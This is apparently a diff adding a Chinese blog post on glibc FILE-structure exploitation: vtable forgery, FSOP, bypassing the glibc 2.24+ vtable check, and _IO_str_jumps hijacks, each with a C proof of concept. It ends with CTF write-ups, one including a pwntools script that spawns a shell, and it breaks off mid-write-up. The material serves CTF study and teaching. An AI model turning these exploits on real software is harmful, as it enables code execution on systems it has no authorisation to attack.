+      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0)
+    write_status = _IO_do_flush (fp);
+  else
+    write_status = 0;
+
+  _IO_unsave_markers (fp);
+
+  int close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == 0
+              ? _IO_SYSCLOSE (fp) : 0);
+
+  /* Free buffer. */
+#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+  if (fp-&gt;_mode &gt; 0)
+    {
+      if (_IO_have_wbackup (fp))
+    _IO_free_wbackup_area (fp);
+      _IO_wsetb (fp, NULL, NULL, 0);
+      _IO_wsetg (fp, NULL, NULL, NULL);
+      _IO_wsetp (fp, NULL, NULL);
+    }
+#endif
+  _IO_setb (fp, NULL, NULL, 0);
+  _IO_setg (fp, NULL, NULL, NULL);
+  _IO_setp (fp, NULL, NULL);
+
+  _IO_un_link ((struct _IO_FILE_plus *) fp);
+  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;
+  fp-&gt;_fileno = -1;
+  fp-&gt;_offset = _IO_pos_BAD;
+
+  return close_status ? close_status : write_status;
+}
+...
+#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
+...
+# define _IO_new_file_finish _IO_file_finish
+...
+void
+_IO_new_file_finish (_IO_FILE *fp, int dummy)
+{
+  if (_IO_file_is_open (fp))
+    {
+      _IO_do_flush (fp);
+      if (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))
+    _IO_SYSCLOSE (fp);
+    }
+  _IO_default_finish (fp, 0);
+}
+</code></pre>
+<h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><h2 id="Forge-Vtable-to-Control-PC"><a href="#Forge-Vtable-to-Control-PC" class="headerlink" title="Forge Vtable to Control PC"></a>Forge Vtable to Control PC</h2><p>伪造 vtable 劫持程序流程的中心思想就是针对 <code>_IO_FILE_plus</code> 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。直接修改 vtable 的方法测试了一下在 glibc-2.19 也不能成功，测试程序的 vtable 正好落在 libc 的数据段上，是只读的：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#define system_ptr 0x00007ffff7a0d000+0x45390
+
+int main() {
+    FILE *fp;
+    uint64_t *vtable_ptr;
+    fp = fopen(&quot;1.txt&quot;, &quot;rw&quot;);
+    if (!fp) {
+        printf(&quot;file not existed.\n&quot;);
+        exit(-1);
+    }
+    vtable_ptr = *(uint64_t *)((uint64_t)fp + 0xd8);
+    memcpy(fp, &quot;sh&quot;, 3);
+    vtable_ptr[7] = system_ptr; // __xsputn
+    fwrite(&quot;X&quot;, 1, 1, fp);
+    return 0;
+}
+</code></pre>
+<p>在可控区域伪造一个 vtable 来替换原来的 vtable 是可行的：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#define system_ptr 0x00007ffff7a0d000+0x45390
+
+int main() {
+    FILE *fp;
+    uint64_t *vtable_addr, *fake_vtable;
+    fp = fopen(&quot;1.txt&quot;, &quot;rw&quot;);
+    if (!fp) {
+        printf(&quot;file not existed.\n&quot;);
+        exit(-1);
+    }
+    fake_vtable = malloc(0x40);
+    vtable_addr = (uint64_t *)((uint64_t)fp + 0xd8);
+    vtable_addr[0] = (uint64_t)fake_vtable;
+    memcpy(fp, &quot;sh&quot;, 3);
+    fake_vtable[7] = system_ptr; // __xsputn
+    fwrite(&quot;X&quot;, 1, 1, fp);
+    return 0;
+}
+</code></pre>
+<h2 id="File-Stream-Oriented-Programming（FSOP）"><a href="#File-Stream-Oriented-Programming（FSOP）" class="headerlink" title="File Stream Oriented Programming（FSOP）"></a>File Stream Oriented Programming（FSOP）</h2><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的 <code>_IO_FILE</code> 结构会使用 <code>_chain</code> 域相互连接形成一个链表，这个链表的头部由 <code>_IO_list_all</code> 维护。FSOP 的核心思想就是劫持 <code>_IO_list_all</code> 的值来伪造链表和其中的 <code>_IO_FILE</code> 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 <code>_IO_flush_all_lockp</code>，这个函数会刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code>。</p>
+<pre><code class="cpp">int
+_IO_flush_all_lockp (int do_lock)
+{
+  int result = 0;
+  struct _IO_FILE *fp;
+  int last_stamp;
+
+#ifdef _IO_MTSAFE_IO
+  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
+  if (do_lock)
+    _IO_lock_lock (list_all_lock);
+#endif
+
+  last_stamp = _IO_list_all_stamp;
+  fp = (_IO_FILE *) _IO_list_all;
+  while (fp != NULL)
+    {
+      run_fp = fp;
+      if (do_lock)
+    _IO_flockfile (fp);
+
+      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+       || (_IO_vtable_offset (fp) == 0
+           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
+                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
+#endif
+       )
+      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
+    result = EOF;
+
+      if (do_lock)
+    _IO_funlockfile (fp);
+      run_fp = NULL;
+
+      if (last_stamp != _IO_list_all_stamp)
+    {
+      /* Something was added to the list.  Start all over again.  */
+      fp = (_IO_FILE *) _IO_list_all;
+      last_stamp = _IO_list_all_stamp;
+    }
+      else
+    fp = fp-&gt;_chain;
+    }
+
+#ifdef _IO_MTSAFE_IO
+  if (do_lock)
+    _IO_lock_unlock (list_all_lock);
+  __libc_cleanup_region_end (0);
+#endif
+
+  return result;
+}
+</code></pre>
+<p><code>_IO_flush_all_lockp</code> 函数不需要手动调用，在一些情况下这个函数会被系统调用：</p>
+<ul>
+<li>当 libc 执行 abort 流程时</li>
+<li>当执行 <code>exit</code> 函数时</li>
+<li>当执行流从 <code>main</code> 函数返回时</li>
+</ul>
+<p><code>_IO_list_all</code> 作为 libc 中的全局变量，需要获取 libc 基址才能得到 <code>_IO_list_all</code> 的地址。要实现 FSOP，还需要使构造的 FILE 能够正常工作，也就是需要 <code>fp-&gt;_mode</code> 的值为 0，<code>fp-&gt;_IO_write_ptr</code> 要大于 <code>fp-&gt;_IO_write_base</code>：</p>
+<pre><code class="cpp">if ((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
+    result = EOF;
+</code></pre>
+<p>伪造 <code>_IO_list_all</code> 和 <code>vtable</code>，最后 <code>exit</code> 时会 Call 到构造的 <code>_IO_overflow</code> 上：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+#define _IO_list_all 0x7ffff7dd2520
+#define mode_offset 0xc0
+#define write_ptr_offset 0x28
+#define write_base_offset 0x20
+#define vtable_offset 0xd8
+#define one_gadget 0x7ffff7a0d000+0xf02a4
+
+int main() {
+    void *ptr, *fake_vtable;
+    uint64_t *list_all_ptr;
+    ptr = malloc(0x200);
+    fake_vtable = (uint64_t)ptr + 0x100;
+
+    *(uint64_t *)((uint64_t)ptr + mode_offset) = 0;
+    *(uint64_t *)((uint64_t)ptr + write_ptr_offset) = 1;
+    *(uint64_t *)((uint64_t)ptr + write_base_offset) = 0;
+    *(uint64_t *)((uint64_t)ptr + vtable_offset) = (uint64_t)ptr + 0x100;
+    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget;
+
+    list_all_ptr = (uint64_t *)_IO_list_all;
+    list_all_ptr[0] = ptr;
+    exit(0);
+}
+</code></pre>
+<h2 id="Attack-with-IO-FILE-gt-glibc-2-24"><a href="#Attack-with-IO-FILE-gt-glibc-2-24" class="headerlink" title="Attack with IO_FILE &gt;= glibc-2.24"></a>Attack with IO_FILE &gt;= glibc-2.24</h2><p>从 glibc-2.24 起，加入了针对 <code>_IO_FILE_plus-&gt;vtable</code> 的检查，在调用虚函数时会首先检查 vtable 地址的合法性。先验证 vtable 是否在 <code>_IO_vtable</code> 段中，如果满足条件就正常执行；否则调用 <code>_IO_vtable_check</code> 进一步检查。具体验证通过计算 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 的值 <code>section_length</code>，然后获取 vtable 到 <code>__start___libc_IO_vtables</code> 的偏移 <code>offset</code>，若 <code>offset</code> 大于等于 <code>section_length</code> 就会调用 <code>_IO_vtable_check</code>：</p>
+<pre><code class="cpp">/* Check if unknown vtable pointers are permitted; otherwise,
+   terminate the process.  */
+void _IO_vtable_check (void) attribute_hidden;
+
+/* Perform vtable pointer validation.  If validation fails, terminate
+   the process.  */
+static inline const struct _IO_jump_t *
+IO_validate_vtable (const struct _IO_jump_t *vtable)
+{
+  /* Fast path: The vtable pointer is within the __libc_IO_vtables
+     section.  */
+  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
+  const char *ptr = (const char *) vtable;
+  uintptr_t offset = ptr - __start___libc_IO_vtables;
+  if (__glibc_unlikely (offset &gt;= section_length))
+    /* The vtable pointer is not in the expected section.  Use the
+       slow path, which will terminate the process if necessary.  */
+    _IO_vtable_check ();
+  return vtable;
+}
+</code></pre>
+<p>在 <code>_IO_vtable_check</code> 中，会具体检查 vtable 是否合法：</p>
+<pre><code class="cpp">void attribute_hidden
+_IO_vtable_check (void)
+{
+#ifdef SHARED
+  /* Honor the compatibility flag.  */
+  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);
+#ifdef PTR_DEMANGLE
+  PTR_DEMANGLE (flag);
+#endif
+  if (flag == &amp;_IO_vtable_check)
+    return;
+
+  /* In case this libc copy is in a non-default namespace, we always
+     need to accept foreign vtables because there is always a
+     possibility that FILE * objects are passed across the linking
+     boundary.  */
+  {
+    Dl_info di;
+    struct link_map *l;
+    if (!rtld_active ()
+        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0
+            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))
+      return;
+  }
+
+#else /* !SHARED */
+  /* We cannot perform vtable validation in the static dlopen case
+     because FILE * handles might be passed back and forth across the
+     boundary.  Therefore, we disable checking in this case.  */
+  if (__dlopen != NULL)
+    return;
+#endif
+
+  __libc_fatal (&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;);
+}
+</code></pre>
+<h3 id="Exploit-with-FILENO"><a href="#Exploit-with-FILENO" class="headerlink" title="Exploit with FILENO"></a>Exploit with FILENO</h3><p>当 vtable 不能被利用了，那么就该想办法在 <code>_IO_FILE</code> 结构体找利用方法。<code>_IO_FILE</code> 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 <code>fwrite</code>、<code>fread</code> 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。因为进程中包含了系统默认的三个文件流 stdin、stdout、stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf、printf 一样可以进行利用。在 <code>_IO_FILE</code> 中 <code>_IO_buf_base</code> 表示操作的起始地址，<code>_IO_buf_end</code> 表示结束地址，通过控制这两个数据可以实现控制读写的操作：</p>
+<pre><code class="cpp">struct _IO_FILE {
+  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
+#define _IO_file_flags _flags
+
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;    /* Current read pointer */
+  char* _IO_read_end;    /* End of get area. */
+  char* _IO_read_base;    /* Start of putback+get area. */
+  char* _IO_write_base;    /* Start of put area. */
+  char* _IO_write_ptr;    /* Current put pointer. */
+  char* _IO_write_end;    /* End of put area. */
+  char* _IO_buf_base;    /* Start of reserve area. */
+  char* _IO_buf_end;    /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */
+
+#define __HAVE_COLUMN /* temporary */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  /*  char* _save_gptr;  char* _save_egptr; */
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+</code></pre>
+<p>在没有执行任何输出函数之前，<code>_IO_2_1_stdin_</code> 结构体如下：</p>
+<pre><code>pwndbg&gt; p/x _IO_2_1_stdin_
+$1 = {
+  file = {
+    _flags = 0xfbad2088,
+    _IO_read_ptr = 0x0,
+    _IO_read_end = 0x0,
+    _IO_read_base = 0x0,
+    _IO_write_base = 0x0,
+    _IO_write_ptr = 0x0,
+    _IO_write_end = 0x0,
+    _IO_buf_base = 0x0,
+    _IO_buf_end = 0x0,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x0,
+    _fileno = 0x0,
+    _flags2 = 0x0,
+    _old_offset = 0xffffffffffffffff,
+    _cur_column = 0x0,
+    _vtable_offset = 0x0,
+    _shortbuf = {0x0},
+    _lock = 0x7ffff7dd3790,
+    _offset = 0xffffffffffffffff,
+    _codecvt = 0x0,
+    _wide_data = 0x7ffff7dd19c0,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0x0,
+    _mode = 0x0,
+    _unused2 = {0x0 &lt;repeats 20 times&gt;}
+  },
+  vtable = 0x7ffff7dd06e0
+}
+</code></pre><p>调用 <code>scanf</code> 之类的函数后可以看到 <code>_IO_read_ptr</code>、<code>_IO_read_base</code>、<code>_IO_read_end</code>、<code>_IO_buf_base</code>、<code>_IO_buf_end</code> 等域都被初始化。而且可以看出来初始化后的内存是在堆上分配的，可以看到输入的数据，且大小是 0x400 个字节，正好是 <code>_IO_buf_base</code> 到 <code>_IO_buf_end</code> 的大小：</p>
+<pre><code>pwndbg&gt; p/x _IO_2_1_stdin_
+$2 = {
+  file = {
+    _flags = 0xfbad2288,
+    _IO_read_ptr = 0x602013,
+    _IO_read_end = 0x602014,
+    _IO_read_base = 0x602010,
+    _IO_write_base = 0x602010,
+    _IO_write_ptr = 0x602010,
+    _IO_write_end = 0x602010,
+    _IO_buf_base = 0x602010,
+    _IO_buf_end = 0x602410,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x0,
+    _fileno = 0x0,
+    _flags2 = 0x0,
+    _old_offset = 0xffffffffffffffff,
+    _cur_column = 0x0,
+    _vtable_offset = 0x0,
+    _shortbuf = {0x0},
+    _lock = 0x7ffff7dd3790,
+    _offset = 0xffffffffffffffff,
+    _codecvt = 0x0,
+    _wide_data = 0x7ffff7dd19c0,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0x0,
+    _mode = 0xffffffff,
+    _unused2 = {0x0 &lt;repeats 20 times&gt;}
+  },
+  vtable = 0x7ffff7dd06e0
+}
+pwndbg&gt; x/10gx 0x602000
+0x602000:    0x0000000000000000    0x0000000000000411
+0x602010:    0x000000000a333231    0x0000000000000000
+0x602020:    0x0000000000000000    0x0000000000000000
+0x602030:    0x0000000000000000    0x0000000000000000
+0x602040:    0x0000000000000000    0x0000000000000000
+</code></pre><p>那么如果修改 <code>_IO_buf_base</code> 和 <code>_IO_buf_end</code> 到某个目标地址地址，就能修改掉目标地址的数据：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+#define _IO_2_1_stdin_addr 0x7ffff7dd18e0
+
+char buf[100] = &quot;This is the Original Buffer.&quot;;
+
+int main() {
+    char stack_buf[100];
+    void *fake_buf_base = (uint64_t)buf;
+    void *fake_buf_end = (uint64_t)buf + 100;
+    void *ptr = _IO_2_1_stdin_addr;
+    *(uint64_t *)((uint64_t)ptr + 0x38) = fake_buf_base;
+    *(uint64_t *)((uint64_t)ptr + 0x40) = fake_buf_end;
+
+    scanf(&quot;%s&quot;, stack_buf);
+    printf(&quot;%s\n&quot;, buf);
+    return 0;
+}
+</code></pre>
+<h3 id="Hijack-IO-str-jumps（-lt-glibc-2-28）"><a href="#Hijack-IO-str-jumps（-lt-glibc-2-28）" class="headerlink" title="Hijack _IO_str_jumps（&lt;= glibc-2.28）"></a>Hijack <code>_IO_str_jumps</code>（&lt;= glibc-2.28）</h3><p>libc 中不仅仅只有 <code>_IO_file_jumps</code> 这个 vtable，还有一个叫做 <code>_IO_str_jumps</code>。而这个 vtable 不在 check 范围之内。如果我们能设置文件指针的 vtable 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数：</p>
+<pre><code class="cpp">const struct _IO_jump_t _IO_str_jumps libio_vtable =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT(finish, _IO_str_finish),
+  JUMP_INIT(overflow, _IO_str_overflow),
+  JUMP_INIT(underflow, _IO_str_underflow),
+  JUMP_INIT(uflow, _IO_default_uflow),
+  JUMP_INIT(pbackfail, _IO_str_pbackfail),
+  JUMP_INIT(xsputn, _IO_default_xsputn),
+  JUMP_INIT(xsgetn, _IO_default_xsgetn),
+  JUMP_INIT(seekoff, _IO_str_seekoff),
+  JUMP_INIT(seekpos, _IO_default_seekpos),
+  JUMP_INIT(setbuf, _IO_default_setbuf),
+  JUMP_INIT(sync, _IO_default_sync),
+  JUMP_INIT(doallocate, _IO_default_doallocate),
+  JUMP_INIT(read, _IO_default_read),
+  JUMP_INIT(write, _IO_default_write),
+  JUMP_INIT(seek, _IO_default_seek),
+  JUMP_INIT(close, _IO_default_close),
+  JUMP_INIT(stat, _IO_default_stat),
+  JUMP_INIT(showmanyc, _IO_default_showmanyc),
+  JUMP_INIT(imbue, _IO_default_imbue)
+};
+</code></pre>
+<h4 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps-&gt;overflow"></a><code>_IO_str_jumps-&gt;overflow</code></h4><p>在修改了 vtable 之后，可以劫持 <code>_IO_str_overflow</code> 来劫持程序流程：</p>
+<pre><code class="cpp">int
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    {
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+    }
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+      else
+    {
+      char *new_buf;
+      char *old_buf = fp-&gt;_IO_buf_base;
+      size_t old_blen = _IO_blen (fp);
+      _IO_size_t new_size = 2 * old_blen + 100;
+      if (new_size &lt; old_blen)
+        return EOF;
+      new_buf
+        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
+      if (new_buf == NULL)
+        {
+          /*      __ferror(fp) = 1; */
+          return EOF;
+        }
+      if (old_buf)
+        {
+          memcpy (new_buf, old_buf, old_blen);
+          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);
+          /* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */
+          fp-&gt;_IO_buf_base = NULL;
+        }
+      memset (new_buf + old_blen, &#39;\0&#39;, new_size - old_blen);
+
+      _IO_setb (fp, new_buf, new_buf + new_size, 1);
+      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
+      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
+      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
+      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);
+
+      fp-&gt;_IO_write_base = new_buf;
+      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
+    }
+    }
+
+  if (!flush_only)
+    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;
+  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
+  return c;
+}
+</code></pre>
+<p>其中通过以下几个条件来绕过：</p>
+<ol>
+<li><code>fp-&gt;_flags &amp; _IO_NO_WRITES</code> 为假；<ul>
+<li>构造 <code>_flags = 0</code>；</li>
+</ul>
+</li>
+<li><code>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_blen (fp) + flush_only</code> 为真（<code>#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</code>）；<ul>
+<li>构造 <code>_IO_write_base = 0</code>、<code>_IO_write_ptr = (bin_sh_in_libc_addr - 100) / 2 + 1</code> 以及 <code>_IO_buf_end = (bin_sh_in_libc_addr - 100) / 2</code>；</li>
+</ul>
+</li>
+<li><code>fp-&gt;_flags &amp; _IO_USER_BUF</code> 为假；</li>
+<li><code>2 * _IO_blen (fp) + 100</code> 不能为负数，且指向 <code>&quot;/bin/sh&quot;</code> 字符串对应的地址；</li>
+<li><code>*((_IO_strfile *) fp)-&gt;_s._allocate_buffer</code>（<code>fp + 0xe0</code>）指向 system 地址。</li>
+</ol>
+<p>即最后执行下面这句语句：</p>
+<pre><code class="cpp">      new_buf
+        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);
+</code></pre>
+<p>测试代码如下（环境为 glibc-2.27）：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+#define libc_base 0x7ffff79e4000
+#define _IO_file_jumps_addr 0x7ffff7dcc360
+#define bin_sh_in_libc_addr libc_base+0x1b3e9a
+#define system_addr libc_base+0x4f440
+
+int main() {
+    FILE *fp;
+    uint64_t *vtable_addr, *libio_vtable_addr;
+    fp = fopen(&quot;1.txt&quot;, &quot;rw&quot;);
+    if (!fp) {
+        printf(&quot;file not existed.\n&quot;);
+        exit(-1);
+    }
+    libio_vtable_addr = _IO_file_jumps_addr;
+    void *fake_write_ptr = (bin_sh_in_libc_addr - 100) / 2 + 1;
+    void *fake_buf_end = (bin_sh_in_libc_addr - 100) / 2;
+    *(uint64_t *)((uint64_t)fp) = 0; // _flags
+    *(uint64_t *)((uint64_t)fp + 0x20) = 0; // _IO_write_base
+    *(uint64_t *)((uint64_t)fp + 0x28) = fake_write_ptr; // _IO_write_ptr
+    *(uint64_t *)((uint64_t)fp + 0x40) = fake_buf_end; // _IO_buf_end
+    *(uint64_t *)((uint64_t)fp + 0xe0) = system_addr;
+    vtable_addr = (uint64_t *)((uint64_t)fp + 0xd8);
+    vtable_addr[0] = (uint64_t)libio_vtable_addr;
+    exit(0);
+}
+</code></pre>
+<h4 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps-&gt;finish"></a><code>_IO_str_jumps-&gt;finish</code></h4><p>同理在 <code>_IO_str_finish</code> 中也可以绕过：</p>
+<pre><code class="cpp">void
+_IO_str_finish (_IO_FILE *fp, int dummy)
+{
+  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))
+    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);
+  fp-&gt;_IO_buf_base = NULL;
+
+  _IO_default_finish (fp, 0);
+}
+</code></pre>
+<p>绕过条件如下：</p>
+<ol>
+<li><code>fp-&gt;_IO_buf_base</code> 不为空；</li>
+<li><code>fp-&gt;_flags &amp; _IO_USER_BUF</code> 为假；<ul>
+<li>构造 <code>_flags = 0</code>、<code>_IO_buf_base = bin_sh_in_libc_addr</code>；</li>
+</ul>
+</li>
+<li><code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code>（<code>fp + 0xe8</code>）指向 system 地址。</li>
+</ol>
+<p>测试代码如下（环境为 glibc-2.27）：</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+#define _IO_2_1_stdin_addr 0x7ffff7dcfa00
+#define libc_base 0x7ffff79e4000
+#define _IO_file_jumps_addr 0x7ffff7dcc360
+#define bin_sh_in_libc_addr libc_base+0x1b3e9a
+#define system_addr libc_base+0x4f440
+
+int main() {
+    FILE *fp;
+    uint64_t *vtable_addr, *libio_vtable_addr;
+    fp = _IO_2_1_stdin_addr;
+    libio_vtable_addr = _IO_file_jumps_addr;
+    *(uint64_t *)((uint64_t)fp) = 0; // _flags
+    *(uint64_t *)((uint64_t)fp + 0x38) = bin_sh_in_libc_addr; // _IO_buf_base
+    *(uint64_t *)((uint64_t)fp + 0xe8) = system_addr;
+    vtable_addr = (uint64_t *)((uint64_t)fp + 0xd8);
+    vtable_addr[0] = (uint64_t)libio_vtable_addr;
+    fclose(fp);
+    return 0;
+}
+</code></pre>
+<h1 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018-HCTF-the_end"></a>2018-HCTF-the_end</h1><p>程序除了 Canary 其他保护全开了。一开始给了 libc 基址，然后可以改 5 个字节，最后 exit 退出：</p>
+<pre><code class="cpp">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  signed int i; // [rsp+4h] [rbp-Ch]
+  void *buf; // [rsp+8h] [rbp-8h]
+
+  sleep(0);
+  printf(&quot;here is a gift %p, good luck ;)\n&quot;, &amp;sleep);
+  fflush(_bss_start);
+  close(1);
+  close(2);
+  for ( i = 0; i &lt;= 4; ++i )
+  {
+    read(0, &amp;buf, 8uLL);
+    read(0, buf, 1uLL);
+  }
+  exit(1337);
+}
+</code></pre>
+<p>因为最后的 exit 会调用到 vtable 中的 setbuf，所以只需要改这个指针就行。方法就是找一个假的 vtable，然后在把对应偏移处的地址改为 one_gadget。又因为只能修改 5 个字节，3 个字节用来修改 one_gadget，2 个字节来改 vtable，所以假的 vtable 原始的高 6 字节要跟原来的一样，而对应的 setbuf 偏移处的值得是一个 libc 上的地址：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]
+
+p = process(&#39;./the_end&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+
+p.recvuntil(&#39;here is a gift &#39;)
+libc_base = int(p.recv(14)[2:], 16) - libc.symbols[&#39;sleep&#39;]
+info(&#39;libc_base = &#39; + hex(libc_base))
+exit = libc_base + libc.symbols[&#39;exit&#39;]
+one_gadget = libc_base + one_gadgets[1]
+vtable = libc_base + libc.symbols[&#39;stderr&#39;] - 8
+info(&#39;vtable = &#39; + hex(vtable))
+fake_vtable = libc_base + 0x3c5588
+fake_setbuf = fake_vtable + 0x58
+
+#gdb.attach(p)
+
+p.recvuntil(&#39;, good luck ;)&#39;)
+for i in range(2):
+    p.send(p64(vtable + i))
+    p.send(p64(fake_vtable)[i])
+for i in range(3):
+    p.send(p64(fake_setbuf + i))
+    p.send(p64(one_gadget)[i])
+
+info(&#39;one_gadget = &#39; + hex(one_gadget))
+p.sendline(&#39;exec /bin/sh 1&gt;&amp;0&#39;)
+p.interactive()
+</code></pre>
+<h1 id="2018-HCTF-baby-printf-ver2"><a href="#2018-HCTF-baby-printf-ver2" class="headerlink" title="2018-HCTF-baby_printf_ver2"></a>2018-HCTF-baby_printf_ver2</h1><p>程序除了 Canary 其他保护全开。一开始会提供一个 buffer 的指针。然后往 buffer 上读数据。最后会检查 stdout 的 <code>_flags</code> 字段是否被修改，如果被改了就会再被改回来。最后输出 buffer 中的值：</p>
+<pre><code class="cpp">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // r13
+  FILE *v4; // r14
+  char buf; // [rsp+3h] [rbp-35h]
+  int i; // [rsp+4h] [rbp-34h]
+  unsigned __int64 v7; // [rsp+8h] [rbp-30h]
+
+  v7 = __readfsqword(0x28u);
+  setbuf(stdout, 0LL);
+  puts(&quot;Welcome to babyprintf_v2.0&quot;);
